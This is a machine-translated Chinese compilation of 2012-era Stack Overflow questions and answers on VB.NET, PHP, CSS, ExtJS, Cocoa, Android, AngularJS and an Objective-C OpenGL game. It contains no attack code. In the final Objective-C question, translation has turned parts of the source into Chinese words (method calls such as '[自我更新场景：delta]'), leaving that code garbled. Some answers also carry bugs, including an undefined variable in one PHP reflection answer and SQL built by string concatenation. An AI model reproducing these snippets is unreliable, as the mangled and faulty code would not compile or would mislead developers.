# StackOverflow 问答 12009000-12009999

# vb.net - 多个或单个“使用”语句？

> ID：12009006
> 
> 赞同：0
> 
> 时间：2012-08-17T15:49:18.950
> 
> 标签：vb.net, using, sqlcommand

我想知道以下在同一`using`语句中处理多个 sql 的方法是否正确，我已经在一个项目中对此进行了测试并且它可以工作，但是将每个 sql 包装在它自己的 using 语句中不是更好吗？哪个选项是更好的编码实践？

```
Using cmd As New SqlCommand()

    cmd.Connection = conn
    cmd.CommandType = CommandType.Text

    sql = "Select * From blah"
    cmd.CommandText = sql
    theValue = cmd.ExecuteScalar()

    sql = "Update tbl1 Set a = b"
    cmd.CommandText = sql
    cmd.ExecuteScalar()

    sql = "Update tbl2 Set x = y"
    cmd.CommandText = sql
    cmd.ExecuteNonQuery()

End Using 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T15:53:05.393

这是一种不好的做法，可能会泄漏一些东西。

我什至不确定 Command.Close 是否存在，但您缺少：

```
sql = "Select * From blah"
cmd.CommandText = sql
theValue = cmd.ExecuteScalar()

cmd.Close()   ' you need something like this

sql = "Update tbl1 Set a = b"
cmd.CommandText = sql
cmd.ExecuteScalar() 
```

首选的方式当然是不重用 Command 对象。为每个操作创建一个新操作，并为每个 IDisposable 对象使用 1 个。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T15:52:20.093

`SqlCommand`就我个人而言，每次执行我都会使用不同的对象。

使用这个简单的脚本很容易看到发生了什么，但是如果您的脚本变得更复杂并且需要 Sql 参数，您必须记住在每次执行后删除它们（如果不需要它们），否则会引发异常。

# php - php函数编码默认参数num

> ID：12009007
> 
> 赞同：0
> 
> 时间：2012-08-17T15:49:24.983
> 
> 标签：php, parameters

在 PHP 中，是否可以获取编码参数计数？

像这样的东西（伪代码）：

```
function($a=false , $b=true){ //the $a=true... is just parameters, with default values
  echo func_num_args();
  echo ", ";
  echo func_get_coded_params(); //how do i do this in PHP?
}

echo function(1 , 2); // output -> 2, 2 

echo function(1, 2, 3, 4, 5, a, b, c); // output -> 8, 2 
```

有没有一种方法/虚构的函数（`func_get_coded_params()`）可以检索默认编码参数计数？在这种情况下，编码参数将是 $a 和 $b 本身返回 2。如果我这样做`function($a, $b, $c)`，它将返回 3

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T15:59:23.823

使用[`ReflectionFunction`](http://uk3.php.net/ReflectionFunction)并调用该 [`getNumberOfParameters`](http://php.net/manual/en/reflectionfunctionabstract.getnumberofparameters.php)方法。

您可以使用以下方法创建当前函数的实例：

```
$func = new ReflectionFunction(__FUNCTION__); 
```

并使用获取定义参数的数量

```
$func->getNumberOfRequiredParameters(); 
```

**编辑**

用于课堂。

```
$func = new ReflectionMethod(__CLASS__, __FUNCTION__); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T15:59:37.530

PHP 有许多有用的`Reflection`类可供您使用。

```
function whatever($a, $b, $c)
{
  $reflection = new ReflectionFunction(__FUNCTION__);
  echo func_num_args() . ', ' .  $reflection->getNumberOfRequiredParameters();
}

whatever(1,2,3,4,5); // Prints 5, 3 
```

检查[http://www.php.net/manual/fr/class.reflectionfunction.php](http://www.php.net/manual/fr/class.reflectionfunction.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:13:27.697

这将满足您的需要：

```
class x
{
    function __construct($a=1,$b=2)
    {

        $constructor = new ReflectionMethod(__CLASS__,__FUNCTION__);
        $params = $func->getNumberOfParameters();
        echo func_num_args().",".$params;
    }
}
$x = new x(1,2,3,4); //output -> 4,2 
```

请注意，由于您在构造函数中为参数定义了默认值，因此您需要调用的是`getNumberOfParameters()`而不是`getNumberOfRequiredParameters()`（因为没有必需的参数，它们都有默认值）

# css - 媒体屏幕可以在电视和投影仪上使用吗？

> ID：12009011
> 
> 赞同：0
> 
> 时间：2012-08-17T15:49:47.677
> 
> 标签：css

`media="screen"`可以在电视和投影仪上使用吗？如下所示：

```
<link rel="stylesheet" media="screen" href="style.css"> 
```

我知道我们可以完全使用`media="screen,projection,tv"`或`media="all"`删除媒体部分（HTML5），但我真的很想知道这个答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T15:53:57.613

不，它不会。`media="screen"`仅适用于电脑屏幕

```
Media Type  Description
all         Used for all media type devices
aural       Used for speech and sound synthesizers
braille     Used for braille tactile feedback devices
embossed    Used for paged braille printers
handheld    Used for small or handheld devices
print       Used for printers
projection  Used for projected presentations, like slides
screen      Used for computer screens
tty         Used for media using a fixed-pitch character grid, like teletypes and terminals
tv          Used for television-type devices 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T15:58:58.220

通常媒体投影和电视被忽略，我们使用屏幕来支持它们。较新的电视将呈现为屏幕，这是有道理的，因为它们现在基本上是更大版本的显示器。

Opera 全屏使用投影，但我认为这不是一个重要因素。这些属性值来自 CSS2，我相信当时的标准有点开放。简而言之：不，您可以将屏幕用于所有不打印的内容。这没有什么区别，但您仍然可以使用 media="screen,projection,tv" 的样式表来安全地播放它。

# json - EXT JS：JSON 不起作用

> ID：12009013
> 
> 赞同：2
> 
> 时间：2012-08-17T15:49:56.423
> 
> 标签：json, extjs, extjs3

我正在尝试使用 EXT JS 创建 Web 应用程序。我按照本教程在我的 WAMP 服务器上安装 EXT JS：[http ://www.objis.com/formation-java/tutoriel-ajax-extjs.html](http://www.objis.com/formation-java/tutoriel-ajax-extjs.html)

我下载了 EXT JS 并将其复制到我的文件夹`C:\wamp\www\lib`中。php.ini 的 include_path 似乎是正确的：我有文件夹`C:\wamp\www\lib`。

然后我尝试了一个基本教程，用数据库（进度数据库）中的数据填充 GridPanel：http: [//tutoriel.lyondev.fr/pages/45-GridPanel-simple.html](http://tutoriel.lyondev.fr/pages/45-GridPanel-simple.html)

php文件是：

```
<?php 
// connexion à la base de données
$connexion = odbc_connect("FILEDSN=C:\Program Files\Fichiers communs\ODBC\Data Sources\comptaLocal102B.dsn;Uid=$user;Pwd=$password;", $user, $password);

if ($connexion == 0)
{
    echo "ERREUR";
}
else
{
    // Query
    $qry = "SELECT cjou, npiece FROM PUB.tlgecrit WHERE tlgecrit.idsoc = 'OCR'";

    // Get Result
    $result = odbc_exec($connexion,$qry);

    // Get Data From Result
    while ($row = odbc_fetch_array($result))
    {
        $data[]=$row;
    }

    //retourne le tableau en JSON
    $return['rows'] = $data;
    echo json_encode($return);

    // Free Result
    odbc_free_result($result);

    // Close Connection
    odbc_close($connexion);
}
?> 
```

js文件是：

```
Ext.onReady(function(){
   var mesChampsDeDonnees = [
    {name: 'cjou'},
    {name: 'npiece'}
];

var monStore = new Ext.data.JsonStore({
    root: 'rows',
    idProperty: 'npiece',
    fields:mesChampsDeDonnees,
    urlAppend:'histo_compte_piece.php',
    autoLoad:true
});

var mesColonnes = [
    {header: 'Journal', width: 200, dataIndex: 'cjou',sortable: true},
    {header: 'N° pièce', width: 200, dataIndex: 'npiece',sortable: true}
];

var monGridPanel = new Ext.grid.GridPanel({
    autoHeight:true,
    renderTo:Ext.getBody(),
    store:monStore,
    columns:mesColonnes
});

monGridPanel.show();
}); 
```

最后我的html文件是：

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>

<head>
    <link rel="stylesheet" type="text/css" href="/lib/extjs/resources/css/ext-all.css" />
    <script type="text/javascript" src="/lib/extjs/adapter/ext/ext-base-debug.js"></script>
    <script type="text/javascript" src="/lib/extjs/ext-all-debug-w-comments.js"></script>
    <script type="text/javascript" src="/lib/extjs/src/locale/ext-lang-fr.js"></script>
    <script type="text/javascript" src="histo_compte_piece.js"></script>
</head>
</head>
<body>
</body>
</html> 
```

我尝试了许多其他教程，但从未奏效。似乎 JSON 不起作用。网格与列标签可见，但始终只有一个空行。

当我在 Firebug 中检查错误时，会出现一个：

```
Erreur : TypeError: url is undefined
Fichier Source : /lib/extjs/ext-all-debug-w-comments.js
Ligne : 1241 
```

我阅读了许多有关此问题的文章，但从未找到解决方案……有人有解决方案吗？

感谢帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:16:43.277

您似乎没有将数据格式化为 JSON，并且您的代码存在一些问题（这也不完整）。我试图修复它。看一看：

```
// this is the object structure that will be returned by the server
var testData = { rows: [{
    cjou: "a", npiece: "b"
}, {
    cjou: "c", npiece: "d"
}]};

var monStore = new Ext.data.JsonStore({
    fields: [ "cjou", "npiece" ],
    autoLoad: true,
    proxy: {
        type: "ajax",
        url: "/echo/json/",   // here you will change to your url
        reader: {
            type: "json",
            root: "rows",
            idProperty: "npiece",
        },
        // some configs to use jsFiddle echo service (you will remove them)
        actionMethods: {
            read: 'POST'
        },
        extraParams: {
            // sending json to the echo service (it will return the same data)
            json: JSON.stringify( testData )
        }
    }
});

var mesColonnes = [
    {header: 'Journal', width: 200, dataIndex: 'cjou',sortable: true},
    {header: 'N° pièce', width: 200, dataIndex: 'npiece',sortable: true}
];

var monGridPanel = new Ext.grid.GridPanel({
    autoHeight: true,
    renderTo: Ext.getBody(),
    store: monStore,
    columns: mesColonnes
}); 
```

你可以在这里看到一个活生生的例子：http: [//jsfiddle.net/davidbuzatto/NN6By/](http://jsfiddle.net/davidbuzatto/NN6By/)

# macos - 给定 contentView 的新大小，调整 NSWindow 的大小

> ID：12009014
> 
> 赞同：2
> 
> 时间：2012-08-17T15:49:58.907
> 
> 标签：macos, cocoa, nswindow

你如何调整`NSWindow`给定的新尺寸`contentView`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T15:49:58.907

```
- (void) resizeWindowWithContentSize:(NSSize)contentSize animated:(BOOL)animated {
    CGFloat titleBarHeight = self.window.frame.size.height - ((NSView*)self.window.contentView).frame.size.height;
    CGSize windowSize = CGSizeMake(contentSize.width, contentSize.height + titleBarHeight);

    // Optional: keep it centered
    float originX = self.window.frame.origin.x + (self.window.frame.size.width - windowSize.width) / 2;
    float originY = self.window.frame.origin.y + (self.window.frame.size.height - windowSize.height) / 2;
    NSRect windowFrame = CGRectMake(originX, originY, windowSize.width, windowSize.height);

    [self.window setFrame:windowFrame display:YES animate:animated];
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-04T21:10:55.663

你可以——</p>

```
[window setContentSize:newContentSize] 
```

还有一些方法可以在窗口和内容大小之间进行转换：

*   `- (NSRect)contentRectForFrameRect:(NSRect)windowFrame`
*   `- (NSRect)frameRectForContentRect:(NSRect)windowContent`

# android - setSelectionRange 解决方法不适用于 android 4.0.3

> ID：12009015
> 
> 赞同：1
> 
> 时间：2012-08-17T15:50:00.190
> 
> 标签：android, cursor

我试图在用户键入时屏蔽电话号码。我已经在 android 2.x 设备上成功地使用了 jquery 和 setTimeout 解决方法下面的 javascript 代码，但我还没有找到适用于 android 4.0.3 的解决方法。

```
if (navigator.userAgent.toLowerCase().indexOf("android") >= 0) {
$.fn.usphone = function() {
    this.keyup(function(e) {
        // do not process del, backspace, escape, arrow left and arrow right characters
        var k = e.which;
        if (k == 8 || k == 46 || k == 27 || k == 37 || k == 39)
            return;
        // remove invalid characters
        var value = "";
        for (var i = 0; i < this.value.length; i++) {
            var ch = this.value[i];
            if (ch >= "0" && ch <= "9")
                value += ch;
        }
        // remove extra characters
        if (value.length > 10)
            value = value.substring(0, 10);
        // insert formatting characters
        if (value.length >= 3)
            value = "(" + value.substring(0, 3) + ")" + value.substring(3);
        if (value.length > 5)
            value = value.substring(0, 5) + " " + value.substring(5);
        if (value.length > 9)
            value = value.substring(0, 9) + "-" + value.substring(9);
        // set new value
        var $this = this;
        var length = value.length;
        setTimeout(function() {
            $this.value = value;
            $this.setSelectionRange(length, length);
        }, 0);
    });
};

$('#contact_edit_page, #contact_new_page, #callback_create, #callback_edit, #new_phonecall_contact_page, #new_phonecall').live('pagecreate', function() {
    $('[type^="tel"]').usphone();
}); 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-10-10T04:03:50.963

我刚刚遇到了同样的问题。我的解决方案如下，

```
.input {
  -webkit-user-modify: read-write;
} 
```

它适用于我的 HTC 的 android 4.0.3。

# angularjs - AngularJS 保存浏览历史

> ID：12009019
> 
> 赞同：2
> 
> 时间：2012-08-17T15:50:06.087
> 
> 标签：angularjs, browser, browser-history

我正在尝试解决一个问题。我希望在控制器中执行操作或功能时将其保存在 brose 历史记录中。例如，我想这样做：

*   在文本框中输入一些内容。
*   单击链接以调用一个函数，该函数将我键入的字符串设置为 $scope 中的变量并将其保存在浏览器历史记录中。
*   使用不同的值执行与上一步相同的操作。
*   如果我从浏览器单击“返回”按钮，我想显示我输入的第一个值。

我有一个我想要的非常简单的示例，但我不知道我必须添加什么才能使用浏览器中的“后退”和“前进”按钮。

[http://jsfiddle.net/XMFua/](http://jsfiddle.net/XMFua/)

非常感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T07:12:10.477

您应该使用该[`$location`服务](http://docs.angularjs.org/api/ng.%24location)来设置 URL。我不知道如何使它在 jsFiddle 上工作，但是以下应该可以工作：

[http://jsfiddle.net/marcenuc/BSDxG/](http://jsfiddle.net/marcenuc/BSDxG/)

# php - PHP以数组形式读取特定的csv文件列

> ID：12009023
> 
> 赞同：3
> 
> 时间：2012-08-17T15:50:27.990
> 
> 标签：php, csv, fgetcsv

我是 PHP 新手，希望能够读取包含两列的 csv 文件，一列是数字（有点像 ID），另一列是整数值。我查找了 fgetcsv 函数，但我无法找到从 csv 文件中读取特定列的方法。

我想只从第二列中获取所有值，没有标题。

有什么办法吗？

这是我到目前为止所拥有的：

```
$file = fopen('data.csv', 'r');
$line = fgetcsv($file); 
```

这是来自 csv 文件的一些示例数据：

```
ID,Value
1,243.00
2,243.00
3,243.00
4,243.00
5,123.11
6,243.00
7,180.00
8,55.00
9,243.00 
```

任何帮助，将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T15:54:27.330

fgetcsv() 一次只读取文件的一行。您必须循环读取文件以获取所有内容：

```
$data = array();
while($row = fgetcsv($file)) {
   $data[] = $row;
} 
```

您可以通过在循环外执行 fgetcsv 来跳过标题，以读取/删除标题值。如果你只想要第二列，你可以这样做：

```
 $data[] = $row[1]; 
```

但是，由于您在那里有数据，也许保留它可能会很有用，再加上用 csv 中的 ID 值键入您的新数组，因此您还可以拥有：

```
 $data[$row[0]] = $row[1]; 
```

然后你漂亮的闪亮新数组将几乎完全匹配 csv 中的内容，但作为由 ID 字段键入的数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T15:54:40.197

```
$csv = array_map("str_getcsv", file("data.csv", "r")); 
$header = array_shift($csv); 
// Seperate the header from data

$col = array_search("Value", $header); 
 foreach ($csv as $row) {      
 $array[] = $row[$col]; 
}
// Iterate through data set, creating array from Value column 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-17T06:19:39.867

```
$fp = fopen($filePath, "r+");
$header = fgetcsv($fp);
while ($members = fgetcsv($fp)) {
    $i = 0;
    foreach ($members as $mem) {
        $membersArray[ $i ][ ] = $mem;
        $i++;
    }
}

$newArray = array_combine($header, array_map("array_filter",$membersArray)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-12T16:14:29.777

```
$header = fgetcsv($h);
$rows = array();
while ($row = fgetcsv($h)) {
    $rows []= array_combine($header, $row);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-08-29T23:27:14.660

你也可以使用这个类[http://code.google.com/p/php-csv-parser/](http://code.google.com/p/php-csv-parser/)

```
<?php

require_once 'File/CSV/DataSource.php';

$csv = new File_CSV_DataSource;
$csv->load('data.csv');
var_export($csv->connect());

?> 
```

# iphone - iOS - 视频播放出现错误

> ID：12009029
> 
> 赞同：0
> 
> 时间：2012-08-17T15:50:45.237
> 
> 标签：iphone, video

当我按照[本教程](http://www.youtube.com/watch?v=cYXAHRvHbQE)进行操作时，它给我一个`[playercontroller release];`在线错误，所以我将其删除，然后当我尝试运行它时它给我[这些错误。](http://aftermathgame.webs.com/Screen+Shot+2012-07-09+at+2.13.05+PM.png)

我尝试制作另一个应用程序来测试视频，它可以无缝运行，但它无法在我的主应用程序中运行。任何人都可以帮忙吗？

当我重新导入框架并尝试播放视频时，它给了我这个错误：

`2012-08-17 11:27:03.174 LYWAM Tour[768:c07] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '*** -[NSURL initFileURLWithPath:]: nil string parameter' *** First throw call stack: (0x1e15022 0x10fdcd6 0x1dbda48 0x1dbd9b9 0xba253b 0xba24c5 0x54ac 0x1e16e99 0x26314e 0x2630e6 0x309ade 0x309fa7 0x308d8a 0x2882cf 0x2885e6 0x26edc4 0x262634 0x16f7ef5 0x1de9195 0x1d4dff2 0x1d4c8da 0x1d4bd84 0x1d4bc9b 0x16f67d8 0x16f688a 0x260626 0x24cd 0x2435 0x1) terminate called throwing an exception(lldb)`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:25:13.297

我认为这`GVE1ViewController`是您自己编写的课程？它确实实现了一个名为的方法`GrommeVideoExcerpt1`吗？您分配给变量的内容实际上是`GVE1ViewController`（或子类）的实例吗？放入 NSLog 以检查它是否真的是`GVE1ViewController`.

要执行 NSLog，您需要以下形式的一行：

```
NSLog(@" My controller = %@", myVar); 
```

您拥有的任何变量在哪里`myVar`包含对`GVE1ViewController`.

# php - 多级菜单项删除递归函数

> ID：12009030
> 
> 赞同：1
> 
> 时间：2012-08-17T15:50:52.983
> 
> 标签：php, mysql

我想使用递归功能从多级菜单中删除类别。为了更仔细地了解情况，让我们先看一下mysql表结构。

```
CREATE TABLE IF NOT EXISTS menu(
id INT(5) NOT NULL AUTO_INCREMENT PRIMARY KEY,
p_id INT(5),
sort_id INT(5) NOT NULL,
title VARCHAR(50) CHARSET utf8 COLLATE 'utf8_unicode_ci' NOT NULL,
); 
```

检索时是这样的

```
 id  |  p_id  |  sort_id  | title  |

   1  |    0   |     1     | root1  |
   2  |    1   |     1     |  sub of root1
   3  |    0   |     2     | root2  |
   4  |    2   |     1     |  sub of "sub of root1"
  ... |  ...   |    ...    |   ....
etc ... 
```

我已经为删除类别编写了 php 脚本，这里是 =>

```
function del_cat($connection,$id){
        if (!$connection->connect_errno){
        if ($connection->set_charset("utf8")){
            if ($r = $connection->query("SELECT id FROM menu WHERE p_id=" . $id . "")){
            if ($r->num_rows>0){
                while ($row = $r->fetch_assoc()){
                del_cat($connection,$row['id']);
                }
            } else {
                $connection->query("DELETE FROM menu WHERE id=" . $id . "");
            }
            $r->free();
            }
        }
        }
    } 
```

`$connection`变量只是一个mysql连接对象，并且`$id`在`id`表中。

例如，当我删除一行时（我的意思是当类别没有子类别时）它工作得很好`1 | 0 | 1 | root1 |`，但是当我想删除时，`4 | 2 | 1 | sub of "sub of root1"`它不会删除带有子类别的类别。知道如何解决这个问题吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:03:20.780

删除只是在，`else`所以你永远不会真正删除父类别。我认为你需要类似的东西：

```
 del_cat($connection, $row['id']);
   $connection->query("DELETE ...");
} else {
   $connection->query("DELETE ..."); 
```

顺便说一句，您应该转义 ID 输入。

# php - PHP 会话变量在 WAMP 的子目录级别丢失

> ID：12009031
> 
> 赞同：1
> 
> 时间：2012-08-17T15:50:54.373
> 
> 标签：php, session, wamp, subdirectory, file-structure

PHP 会话在根目录和一个目录深处按预期工作。存在 2 深的目录最终会获得一个新的会话 ID，并且所有会话变量都将丢失。

我在调用和初始化 SESSION 变量的所有页面中包含一个文件`config.inc.php`（绝对路径） 。`session_start()`我发现一个 PHP 指令设置似乎提到了子目录，但它看起来像是指临时存储的会话文件的子目录。

我已经使用 HTTPFox firefox 插件进行了仔细检查，只要我访问任何第 2 层深度的页面，会话就会消失，并且会发出一个新的会话 ID。很奇怪...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T15:50:54.373

啊，看起来我正在将我的 URLS 写入那些特定目录，`localhost`而不是使用`127.0.0.1`...不同的域导致浏览器认为它是一个不同的网站，我猜。改变这个解决了我的问题。

# objective-c - 奇怪的错误信息，如何解决？

> ID：12009036
> 
> 赞同：-4
> 
> 时间：2012-08-17T15:51:07.867
> 
> 标签：objective-c, ios, xcode

所以我只是在编写代码，然后当我点击构建时 Xcode 开始出现问题，并给了我所有这些我以前从未遇到过的错误

这是文件：

> # 进口
> 
> ```
> #import <OpenGLES/EAGLDrawable.h>
> 
> #import "EAGLView.h"
> 
> #define USE_DEPTH_BUFFER 0
> 
> // A class extension to declare private methods @interface EAGLView ()
> 
> @property (nonatomic, retain) EAGLContext *context; @property (nonatomic, assign) NSTimer *animationTimer;
> 
> - (BOOL) createFramebuffer;
> - (void) destroyFramebuffer;
> - (void) updateScene:(float)delta;
> - (void) renderScene;
> 
> @end
> 
> @implementation EAGLView
> 
> @synthesize context; @synthesize animationTimer; @synthesize animationInterval;
> 
> // You must implement this method
> + (Class)layerClass {
>     return [CAEAGLLayer class]; }
> 
> //The GL view is stored in the nib file. When it's unarchived it's sent -initWithCoder:
> - (id)initWithCoder:(NSCoder*)coder {
> 
>     if ((self = [super initWithCoder:coder])) {
>         // Get the layer
>         CAEAGLLayer *eaglLayer = (CAEAGLLayer *)self.layer;
> 
>         eaglLayer.opaque = YES;
>         eaglLayer.drawableProperties = [NSDictionary dictionaryWithObjectsAndKeys:
>                                         [NSNumber numberWithBool:NO], kEAGLDrawablePropertyRetainedBacking, 
> ```
> 
> kEAGLColorFormatRGBA8, kEAGLDrawablePropertyColorFormat, nil];
> 
> ```
>  context = [[EAGLContext alloc] initWithAPI:kEAGLRenderingAPIOpenGLES1];
> 
>         if (!context || ![EAGLContext setCurrentContext:context]) {
>             [self release];
>             return nil;
>         }
> 
>         animationInterval = 1.0 / 60.0;
>               CGRect rect = [[UIScreen mainScreen] bounds];
>               // Set up OpenGL projection matrix      glMatrixMode(GL_PROJECTION);        glLoadIdentity();       glOrthof(0, 
> ```
> 
> rect.size.width, 0, rect.size.height, -1, 1); glMatrixMode(GL_MODELVIEW); glViewport(0, 0, rect.size.width, rect.size.height); // 初始化 OpenGL 状态 glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA); glDisable(GL_DEPTH_TEST); glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_BLEND_SRC); glEnableClientState(GL_VERTEX_ARRAY); glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // 初始化 [self initGame];
> 
> ```
>  UIAccelerometer *accel = [UIAccelerometer sharedAccelerometer];
>         accel.delegate = self;
>         accel.updateInterval = 1.0f / 60.0f;
> 
>         //[sharedSoundManager playMusicWithKey:@"song" timesToRepeat:-1];
>     }
>     return self; }
> 
> -(void) initGame{
>     //SET GAME STATE
>     //0 = Menu
>     //1 = Gameplay
>     //2 = death screen
>     gameState = 0;
> 
>     player = [[Circle alloc] init];
> 
>     score = 0;
>     scoreString = [NSString alloc];
>     scoreAdder = 1;
>     //[self setupScore];
> 
>     menu = [[Image alloc] initWithImage:[UIImage imageNamed:@"loadImage.png"]];
>     bk = [[Image alloc] initWithImage:[UIImage imageNamed:@"bk.png"]];
>     squared = [[Image alloc] initWithImage:[UIImage imageNamed:@"squared.png"]];
> 
>     gameRunning = TRUE;
>     gameState = 0;
> 
>     squares = [[Squares alloc] init];
>     [squares addSquare: CGPointMake(100, 100) : 0];
>     //font = [[AngelCodeFont alloc]initWithFontImageNamed:@"font1.png" controlFile:@"font1.fnt" 
> ```
> 
> 比例：0.0f 过滤器：无]；
> 
> ```
>  // Init sound     sharedSoundManager = [SingletonSoundManager sharedSoundManager];    [sharedSoundManager loadSoundWithKey:@"menu" 
> ```
> 
> 文件名：@“菜单”文件扩展：@“mp3”频率：22050]；[sharedSoundManager loadBackgroundMusicWithKey:@"music" fileName:@"bkmmusic" fileExt:@"aif"];
> 
> ```
>  menuMusicVariable = 1;
>     gameMusicVariable = 1;
>      }
> 
> -(void) setRunning: (bool) boolean{
>     gameRunning = boolean; }
> 
> -(void) runContinueCountdown{
>     if(gameRunning == NO){
> 
>         int timer = 300;
>         int countdownNum;
>         timer --;
> 
>         if(timer <= 300){
>             if(timer > 200){
>                 countdownNum = 3;
>             }
> 
>         if(timer <= 200){
>             if(timer > 100){
>                 countdownNum = 2;
>             }
>         }
> 
>         if(timer <= 100){
>             if(timer >= 1){
>                 countdownNum = 1;
>             }
>         }
> 
>         if(timer == 0 && countdownNum == 1){
>             [self setRunning: YES];
>         }
>     } }
> 
> - (void) mainGameLoop {   CFTimeInterval      time;   float               delta;  time = CFAbsoluteTimeGetCurrent();  delta = (time - lastTime); 
> ```
> 
> [自我更新场景：delta]；[自渲染场景]; 最后时间=时间；}
> 
> ```
> - (void)updateScene:(float)delta {    // Update Game Logic
>     if(gameRunning){
>         if(gameState == 0){
> 
>             //MENU
> 
>             if(menuMusicVariable == 1){
>                 [sharedSoundManager stopPlayingMusic];
>                 [sharedSoundManager playSoundWithKey:@"Menu" gain:10 pitch:10 location:Vector2fMake(0, 0) shouldLoop: TRUE];
>                 menuMusicVariable = 0;
>             }
> 
>             [scoreLabel setHidden: YES];
> 
>         } else if(gameState == 1){
> 
>             //GAMEPLAY
> 
>             if(gameMusicVariable == 1){
>                 [sharedSoundManager stopPlayingMusic];
>                 [sharedSoundManager playMusicWithKey: @"music" timesToRepeat: -1];
>                 gameMusicVariable = 0;
>             }
> 
>             [scoreLabel setHidden: NO];
> 
>             //game is running
> 
>             if([player getAlive] == true){
>                 score = score + scoreAdder;
>             } else {
>                 score = score;
>             }
> 
>             [player move];
> 
>             [self checkSquareToCircleCollisions];
>             [self checkSquareToSquareCollisions];
> 
>             [squares update];
> 
>         } else if(gameState == 2){
> 
>             //DEATH SCREEN
> 
>             [sharedSoundManager stopPlayingMusic];
> 
>             [scoreLabel setBounds: CGRectMake(100, 100 , 100, 40)];
>         }
>     } else {
>         //game is puased
> 
>     } }
> 
> - (void)renderScene {
>       // Make sure we are renderin to the frame buffer
>     [EAGLContext setCurrentContext:context];
>     glBindFramebufferOES(GL_FRAMEBUFFER_OES, viewFramebuffer);
>       // Clear the color buffer with the glClearColor which has been set  glClear(GL_COLOR_BUFFER_BIT);       //Render the game Scene 
>     if(gameState == 0){
> 
>         //MENU
>         [menu renderAtPoint: CGPointMake(0, 0) centerOfImage: NO];
> 
>     } else if(gameState == 1){
> 
>         //GAMEPLAY
> 
>         [bk renderAtPoint: CGPointMake(0, 0) centerOfImage: NO];
> 
>         [self drawScore];
> 
>         [player draw];
> 
>         [squares render];
>         //[font drawStringAt: CGPointMake(150, 100) text:@"HELLO FONTS"];
>     } else if(gameState ==2){
> 
>         //DEATH SCREEN
> 
>         [squared renderAtPoint: CGPointMake(0, 0) centerOfImage: NO];
> 
>     }         // Switch the render buffer and framebuffer so our scene is displayed on the screen
>     glBindRenderbufferOES(GL_RENDERBUFFER_OES, viewRenderbuffer);
>     [context presentRenderbuffer:GL_RENDERBUFFER_OES]; }
> 
> - (void)layoutSubviews {
>     [EAGLContext setCurrentContext:context];
>     [self destroyFramebuffer];
>     [self createFramebuffer];
>     [self renderScene]; }
> 
> - (BOOL)createFramebuffer {
> 
>     glGenFramebuffersOES(1, &viewFramebuffer);
>     glGenRenderbuffersOES(1, &viewRenderbuffer);
> 
>     glBindFramebufferOES(GL_FRAMEBUFFER_OES, viewFramebuffer);
>     glBindRenderbufferOES(GL_RENDERBUFFER_OES, viewRenderbuffer);
>     [context renderbufferStorage:GL_RENDERBUFFER_OES fromDrawable:(CAEAGLLayer*)self.layer];
>     glFramebufferRenderbufferOES(GL_FRAMEBUFFER_OES, GL_COLOR_ATTACHMENT0_OES, GL_RENDERBUFFER_OES, viewRenderbuffer);
> 
>     glGetRenderbufferParameterivOES(GL_RENDERBUFFER_OES, GL_RENDERBUFFER_WIDTH_OES, &backingWidth);
>     glGetRenderbufferParameterivOES(GL_RENDERBUFFER_OES, GL_RENDERBUFFER_HEIGHT_OES, &backingHeight);
> 
>     if (USE_DEPTH_BUFFER) {
>         glGenRenderbuffersOES(1, &depthRenderbuffer);
>         glBindRenderbufferOES(GL_RENDERBUFFER_OES, depthRenderbuffer);
>         glRenderbufferStorageOES(GL_RENDERBUFFER_OES, GL_DEPTH_COMPONENT16_OES, backingWidth, backingHeight);
>         glFramebufferRenderbufferOES(GL_FRAMEBUFFER_OES, GL_DEPTH_ATTACHMENT_OES, GL_RENDERBUFFER_OES, depthRenderbuffer);
>     }
> 
>     if(glCheckFramebufferStatusOES(GL_FRAMEBUFFER_OES) != GL_FRAMEBUFFER_COMPLETE_OES) {
>         NSLog(@"failed to make complete framebuffer object %x", glCheckFramebufferStatusOES(GL_FRAMEBUFFER_OES));
>         return NO;
>     }
> 
>     return YES; }
> 
> - (void)destroyFramebuffer {
> 
>     glDeleteFramebuffersOES(1, &viewFramebuffer);
>     viewFramebuffer = 0;
>     glDeleteRenderbuffersOES(1, &viewRenderbuffer);
>     viewRenderbuffer = 0;
> 
>     if(depthRenderbuffer) {
>         glDeleteRenderbuffersOES(1, &depthRenderbuffer);
>         depthRenderbuffer = 0;
>     } }
> 
> - (void)startAnimation {
>     self.animationTimer = [NSTimer scheduledTimerWithTimeInterval:animationInterval target:self 
> ```
> 
> 选择器：@selector(mainGameLoop) 用户信息：nil 重复：YES]; }
> 
> ```
> - (void)stopAnimation {
>     self.animationTimer = nil; }
> 
> - (void)setAnimationTimer:(NSTimer *)newTimer {
>     [animationTimer invalidate];
>     animationTimer = newTimer; }
> 
> - (void)setAnimationInterval:(NSTimeInterval)interval {
> 
>     animationInterval = interval;
